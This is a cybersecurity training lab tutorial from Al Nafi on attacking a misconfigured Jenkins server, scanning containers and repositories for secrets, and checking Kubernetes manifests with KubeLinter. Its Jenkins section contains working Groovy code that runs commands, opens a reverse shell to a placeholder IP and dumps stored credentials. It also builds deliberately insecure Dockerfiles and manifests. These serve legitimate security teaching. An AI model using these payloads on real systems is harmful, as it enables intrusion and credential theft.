<div align="center">

# 🕵️ Auditing and Attacking Modern DevSecOps Systems

### Jenkins Exploitation • Secret Scanning • Kubernetes Static Analysis

![Jenkins](https://img.shields.io/badge/Jenkins-D24939?style=for-the-badge&logo=jenkins&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)
![Groovy](https://img.shields.io/badge/Groovy-4298B8?style=for-the-badge&logo=apachegroovy&logoColor=white)
![TruffleHog](https://img.shields.io/badge/TruffleHog-black?style=for-the-badge&logoColor=white)
![GitLeaks](https://img.shields.io/badge/GitLeaks-orange?style=for-the-badge&logoColor=white)
![KubeLinter](https://img.shields.io/badge/KubeLinter-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)

</div>

> ⚠️ **Authorized use only.** Every technique in this lab is performed exclusively against the dedicated, disposable Al Nafi cloud lab environment. Running these steps against systems you do not own or lack explicit written authorization to test is illegal in most jurisdictions.

---

## 📑 Table of Contents

- [🎯 Learning Objectives](#-learning-objectives)
- [📋 Prerequisites](#-prerequisites)
- [🖥️ Lab Environment Setup](#️-lab-environment-setup)
- [🔓 Task 1: Exploiting Jenkins Misconfigurations](#-task-1-exploiting-jenkins-misconfigurations)
- [🔑 Task 2: Scanning for Secrets in Container Images and Servers](#-task-2-scanning-for-secrets-in-container-images-and-servers)
- [☸️ Task 3: Static Analysis of Kubernetes Configurations using KubeLinter](#️-task-3-static-analysis-of-kubernetes-configurations-using-kubelinter)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🔧 Troubleshooting Common Issues](#-troubleshooting-common-issues)
- [✅ Lab Validation and Testing](#-lab-validation-and-testing)
- [🏁 Conclusion](#-conclusion)

---

## 🎯 Learning Objectives

| # | Objective |
|---|-----------|
| 1 | Identify and exploit common Jenkins misconfigurations to gain unauthorized system access |
| 2 | Perform comprehensive secret scanning on container images and server filesystems |
| 3 | Conduct static security analysis of Kubernetes configurations using KubeLinter |
| 4 | Understand the security implications of misconfigured DevSecOps tools |
| 5 | Apply security best practices to prevent common DevSecOps vulnerabilities |
| 6 | Use open-source security tools to audit modern containerized environments |

## 📋 Prerequisites

| Area | Requirement |
|------|-------------|
| 🐧 Linux | Basic understanding of command line operations |
| 🐳 Docker | Familiarity with containers and basic containerization concepts |
| ☸️ Kubernetes | Basic knowledge of architecture and YAML configuration files |
| 🔁 CI/CD | Understanding of pipeline concepts |
| 🌐 Networking | Basic knowledge — ports, services, HTTP requests |
| 📝 Editors | Familiarity with nano or vim |

## 🖥️ Lab Environment Setup

> ☁️ **Ready-to-Use Cloud Machines** — Al Nafi provides a pre-configured, dedicated Linux-based cloud environment for this lab. Click **Start Lab** — no VM building or extra installs.

| Component | Purpose |
|---|---|
| 🐧 Ubuntu 20.04 LTS | Base OS, all tools pre-installed |
| ⚙️ Jenkins (port 8080) | Deliberately misconfigured target CI/CD server |
| 🐳 Docker Engine | Runs sample vulnerable containers |
| ☸️ Kubernetes cluster | Pre-loaded with misconfigured deployments |
| 🛡️ Security scanning tools | TruffleHog, GitLeaks, KubeLinter, and more |

---

## 🔓 Task 1: Exploiting Jenkins Misconfigurations

![Jenkins](https://img.shields.io/badge/Jenkins-D24939?style=flat-square&logo=jenkins&logoColor=white) ![Groovy](https://img.shields.io/badge/Groovy-4298B8?style=flat-square&logo=apachegroovy&logoColor=white)

### 🔎 Subtask 1.1: Initial Jenkins Reconnaissance

```bash
# 🔍 confirm Jenkins is running
sudo systemctl status jenkins
```

```bash
# 🔍 confirm it's reachable
curl -I http://localhost:8080
```

```bash
# 🚩 check for anonymous access — JSON output = critical misconfiguration
curl -s http://localhost:8080/api/json | jq .
```

### 📡 Subtask 1.2: Exploring Jenkins API Endpoints

```bash
# 📋 list all jobs without authentication
curl -s http://localhost:8080/api/json?tree=jobs[name,url] | jq '.jobs[]'
```

```bash
# 🚩 check for script console access
curl -s http://localhost:8080/script
```

```bash
# 👤 enumerate users
curl -s http://localhost:8080/asynchPeople/api/json | jq '.users[].user.fullName'
```

### 💻 Subtask 1.3: Exploiting Script Console Access

> 🚩 The Jenkins script console executes Groovy with **system-level privileges** — unauthenticated access here is a critical finding.

```
# 🌐 access via browser: http://localhost:8080/script
# If reachable without authentication, this is a critical vulnerability
```

```groovy
// ⚙️ execute system commands via Groovy
def command = "whoami"
def process = command.execute()
process.waitFor()
println process.text
```

```groovy
// 📄 read sensitive files
def file = new File("/etc/passwd")
if (file.exists()) {
    println file.text
}
```

```groovy
// 🚩 reverse shell payload (lab callback host only — never a real target)
def command = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
command.execute()
```

### 🔑 Subtask 1.4: Credential Harvesting

```groovy
// 🔑 extract stored Jenkins credentials
import jenkins.model.*
import hudson.security.*
import hudson.util.Secret

def instance = Jenkins.getInstance()
def credentialsStore = instance.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0]

if (credentialsStore != null) {
    def credentials = credentialsStore.getCredentials()
    credentials.each { cred ->
        println "ID: ${cred.id}"
        println "Description: ${cred.description}"
        if (cred.hasProperty('username')) {
            println "Username: ${cred.username}"
        }
        if (cred.hasProperty('password')) {
            println "Password: ${Secret.toString(cred.password)}"
        }
        println "---"
    }
}
```

```bash
# 🔎 check build history for leaked secrets
find /var/lib/jenkins/jobs -name "build.xml" -exec grep -l "password\|secret\|key" {} \;
```

---

## 🔑 Task 2: Scanning for Secrets in Container Images and Servers

![TruffleHog](https://img.shields.io/badge/TruffleHog-black?style=flat-square&logoColor=white) ![GitLeaks](https://img.shields.io/badge/GitLeaks-orange?style=flat-square&logoColor=white)

### 🛠️ Subtask 2.1: Installing and Configuring Secret Scanning Tools

```bash
# 🔑 TruffleHog — secret detection
pip3 install truffleHog
```

```bash
# 🔑 GitLeaks — Git repository scanning
wget https://github.com/zricethezav/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/
```

```bash
# 🐳 Docker Bench Security
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security
```

### 🐳 Subtask 2.2: Scanning Container Images for Secrets

```bash
# 📋 list available images
docker images
```

Build an intentionally vulnerable image for the exercise:

```bash
mkdir vulnerable-app
cd vulnerable-app
```

```dockerfile
# 🚩 Dockerfile — secrets baked into env vars (intentional, for scanner demonstration)
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl
COPY . /app
WORKDIR /app
ENV AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ENV DATABASE_PASSWORD=super_secret_password123
EXPOSE 8080
CMD ["echo", "Vulnerable app running"]
```

```json
{
  "database": {
    "host": "localhost",
    "username": "admin",
    "password": "admin123!@#",
    "api_key": "sk-1234567890abcdef"
  },
  "github_token": "ghp_1234567890abcdefghijklmnopqrstuvwxyz"
}
```

```bash
docker build -t vulnerable-app:latest .
```

```bash
# 🔍 scan the image layers with TruffleHog
docker save vulnerable-app:latest | truffleHog --json
```

```bash
# 📦 extract and scan the container filesystem directly
docker create --name temp-container vulnerable-app:latest
docker export temp-container > vulnerable-app.tar
mkdir extracted-fs
tar -xf vulnerable-app.tar -C extracted-fs/
docker rm temp-container
```

```bash
truffleHog --json extracted-fs/
```

### 🖥️ Subtask 2.3: Scanning Server Filesystems

```bash
# 🏠 scan home directories
find /home -name ".*" -type f 2>/dev/null | head -20 | xargs grep -l "password\|secret\|key\|token" 2>/dev/null

# ⚙️ scan configuration directories
find /etc -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -l "password\|secret\|key" 2>/dev/null

# 📜 scan log files
find /var/log -name "*.log" 2>/dev/null | head -10 | xargs grep -i "password\|secret\|key\|token" 2>/dev/null
```

Use GitLeaks against a test repository:

```bash
mkdir test-repo
cd test-repo
git init
```

```python
# 🚩 app.py — hardcoded secrets (intentional, for scanner demonstration)
import os

# Bad practice - hardcoded secrets
API_KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
DATABASE_URL = "postgresql://user:password123@localhost:5432/mydb"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"

def connect_to_database():
    password = "super_secret_password"
    return f"Connecting with {password}"
```

```bash
git add .
git commit -m "Initial commit with secrets"

# 🔍 scan with GitLeaks
gitleaks detect --source . --verbose
```

```toml
# 📝 custom-rules.toml — extend detection beyond built-in rules
[[rules]]
id = "custom-api-key"
description = "Custom API Key"
regex = '''sk-[a-zA-Z0-9]{32}'''

[[rules]]
id = "database-password"
description = "Database Password"
regex = '''password["\s]*[:=]["\s]*[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]{8,}'''
```

```bash
gitleaks detect --source . --config custom-rules.toml
```

---

## ☸️ Task 3: Static Analysis of Kubernetes Configurations using KubeLinter

![KubeLinter](https://img.shields.io/badge/KubeLinter-326CE5?style=flat-square&logo=kubernetes&logoColor=white)

### 🛠️ Subtask 3.1: Installing and Setting Up KubeLinter

```bash
# ⬇️ install KubeLinter
wget https://github.com/stackrox/kube-linter/releases/download/0.6.8/kube-linter-linux.tar.gz
tar -xzf kube-linter-linux.tar.gz
sudo mv kube-linter /usr/local/bin/
```

```bash
# ✅ verify installation
kube-linter version
```

### 🚩 Subtask 3.2: Creating Vulnerable Kubernetes Configurations

```bash
mkdir k8s-configs
cd k8s-configs
```

```yaml
# 🚩 vulnerable-deployment.yaml — plaintext secrets + privileged container
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
  labels:
    app: vulnerable-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: vulnerable-app
  template:
    metadata:
      labels:
        app: vulnerable-app
    spec:
      containers:
      - name: app
        image: nginx:latest
        ports:
        - containerPort: 80
        env:
        - name: DATABASE_PASSWORD
          value: "plaintext-password"
        - name: API_KEY
          value: "sk-1234567890abcdef"
        securityContext:
          runAsUser: 0
          privileged: true
          allowPrivilegeEscalation: true
        resources: {}
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-service
spec:
  selector:
    app: vulnerable-app
  ports:
  - port: 80
    targetPort: 80
  type: LoadBalancer
```

```yaml
# 🚩 vulnerable-pod.yaml — host namespace sharing + hostPath mount to / (classic escape setup)
apiVersion: v1
kind: Pod
metadata:
  name: insecure-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: insecure-container
    image: ubuntu:latest
    command: ["/bin/sleep", "3600"]
    securityContext:
      privileged: true
      runAsUser: 0
      capabilities:
        add:
        - SYS_ADMIN
        - NET_ADMIN
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

```yaml
# 🚩 vulnerable-configmap.yaml — secrets stored in plaintext ConfigMap
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  database.properties: |
    db.host=localhost
    db.username=admin
    db.password=admin123
    api.key=sk-abcdef1234567890
  app.conf: |
    [database]
    password = "super_secret_password"
    [api]
    token = "ghp_1234567890abcdefghijklmnop"
```

### 🔍 Subtask 3.3: Running KubeLinter Security Analysis

```bash
# 🔍 basic scan
kube-linter lint k8s-configs/
```

```bash
# 📊 detailed JSON output
kube-linter lint --format json k8s-configs/ | jq .
```

```bash
# 🎯 check specific issue categories
kube-linter lint --include privilege-escalation-container k8s-configs/
kube-linter lint --include run-as-non-root k8s-configs/
kube-linter lint --include no-resource-limits k8s-configs/
```

```bash
# 📄 SARIF report for downstream tooling
kube-linter lint --format sarif k8s-configs/ > security-report.sarif
```

### 📊 Subtask 3.4: Analyzing and Interpreting Results

```bash
#!/bin/bash
# 📊 analyze-results.sh
echo "=== KubeLinter Security Analysis Summary ==="
echo

# 🔢 count total issues
TOTAL_ISSUES=$(kube-linter lint k8s-configs/ --format json | jq '.Reports | length')
echo "Total Security Issues Found: $TOTAL_ISSUES"
echo

# 📂 group by category
echo "Issues by Category:"
kube-linter lint k8s-configs/ --format json | jq -r '.Reports[] | .Check' | sort | uniq -c | sort -nr

echo
echo "=== Detailed Issues ==="
kube-linter lint k8s-configs/ --format json | jq -r '.Reports[] | "File: \(.Object.K8sObject.Name) | Check: \(.Check) | Message: \(.Message)"'
```

```bash
chmod +x analyze-results.sh
./analyze-results.sh
```

✅ Fix the identified issues:

```yaml
# ✅ secure-deployment.yaml — remediated version
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
  labels:
    app: secure-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      containers:
      - name: app
        image: nginx:1.21.6  # Specific version instead of latest
        ports:
        - containerPort: 80
        env:
        - name: DATABASE_PASSWORD
          valueFrom:
            secretKeyRef:
              name: app-secrets
              key: database-password
        securityContext:
          runAsNonRoot: true
          runAsUser: 1000
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop:
            - ALL
        resources:
          limits:
            cpu: 500m
            memory: 512Mi
          requests:
            cpu: 250m
            memory: 256Mi
        livenessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 5
          periodSeconds: 5
---
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  database-password: c3VwZXJfc2VjcmV0X3Bhc3N3b3Jk  # base64 encoded
```

```bash
# ✅ verify the fixes
kube-linter lint secure-deployment.yaml
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique | How This Lab Addresses It |
|---|---|---|
| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Anonymous access to the Jenkins web interface and script console is the entry point exploited in Task 1 |
| [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter | The Groovy script console executes arbitrary commands with Jenkins' system-level privileges |
| [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Unsecured Credentials: Credentials In Files | Hardcoded secrets in Dockerfile `ENV`, `config.json`, `app.py`, and the Kubernetes ConfigMap are what TruffleHog and GitLeaks are built to catch |
| [T1555](https://attack.mitre.org/techniques/T1555/) | Credentials from Password Stores | The Groovy script that iterates Jenkins' `SystemCredentialsProvider` extracts credentials directly from its internal store |
| [T1611](https://attack.mitre.org/techniques/T1611/) | Escape to Host | `insecure-pod.yaml`'s combination of `hostPID`/`hostNetwork`/`hostIPC`, a privileged container, and a hostPath mount of `/` is a textbook container-escape configuration — exactly what KubeLinter's privilege-escalation checks flag |

---

## 🔧 Troubleshooting Common Issues

<details>
<summary>🔴 Jenkins Access Issues</summary>

**Problem:** Cannot access Jenkins on port 8080
**Solution:** Check if the Jenkins service is running: `sudo systemctl start jenkins`

</details>

<details>
<summary>🔴 Docker Permission Issues</summary>

**Problem:** Permission denied when running Docker commands
**Solution:** Add your user to the docker group: `sudo usermod -aG docker $USER`, then log out and back in

</details>

<details>
<summary>🔴 KubeLinter Installation Issues</summary>

**Problem:** KubeLinter binary not found
**Solution:** Ensure the binary is in `PATH`: `export PATH=$PATH:/usr/local/bin`

</details>

<details>
<summary>🔴 Secret Scanning False Positives</summary>

**Problem:** Too many false positive results
**Solution:** Use custom rules and filters to reduce noise

</details>

---

## ✅ Lab Validation and Testing

```bash
# 🔓 verify Jenkins exploitation — confirm command execution
curl -X POST http://localhost:8080/script -d "script=println('whoami'.execute().text)"
```

```bash
# 🔑 validate secret detection
echo "API_KEY=sk-1234567890abcdef" > test-secret.txt
truffleHog --json test-secret.txt
```

```bash
# ☸️ confirm KubeLinter finds security issues
kube-linter lint k8s-configs/ | grep -c "found"
```

---

## 🏁 Conclusion

In this comprehensive lab, you have successfully:

- 🔓 **Exploited Jenkins misconfigurations** — identifying anonymous access vulnerabilities, accessing the script console, and extracting sensitive credentials, demonstrating how improper CI/CD security can lead to complete system compromise
- 🔑 **Performed thorough secret scanning** using multiple tools (TruffleHog, GitLeaks) to detect hardcoded credentials in container images, filesystems, and Git repositories, highlighting the critical importance of proper secret management
- ☸️ **Conducted static security analysis** of Kubernetes configurations using KubeLinter to identify privilege escalation risks, resource limit issues, and security context misconfigurations, showing how infrastructure-as-code requires security validation

### 💡 Why This Matters

Modern DevSecOps environments are complex ecosystems where a single misconfiguration can expose entire infrastructures. The techniques covered in this lab represent real-world attack vectors that malicious actors actively exploit. Understanding these vulnerabilities lets you:

- Implement proper security controls in CI/CD pipelines
- Establish secret management best practices
- Create secure Kubernetes deployment standards
- Perform regular security audits of DevSecOps toolchains

### 🚀 Next Steps

Apply these skills in your own environments by regularly auditing Jenkins instances, implementing automated secret scanning in your CI/CD pipelines, and using tools like KubeLinter as part of your infrastructure security validation process.

> 🔁 **Remember:** Security is not a one-time activity but an ongoing process that must be integrated into every aspect of the development and deployment lifecycle.

</br>

<div align="center">

**📚 Provided by [Al Nafi](https://alnafi.com) — Cloud & Cybersecurity Training**

![Al Nafi](https://img.shields.io/badge/Al%20Nafi-Cybersecurity%20Training-blue?style=for-the-badge)

</div>
